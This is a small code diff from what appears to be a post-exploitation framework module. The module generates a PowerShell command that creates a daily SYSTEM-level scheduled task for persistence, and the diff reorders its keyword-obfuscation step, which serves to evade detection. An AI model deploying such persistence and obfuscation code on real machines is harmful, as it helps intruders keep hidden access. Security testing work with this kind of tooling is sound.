@@ -281,8 +281,9 @@ class Module(object):
             script += "schtasks /Create /F /RU system /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
         script += "'Schtasks persistence established "+statusMsg+"'"
-        script = helpers.keyword_obfuscation(script)
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
 
         return script
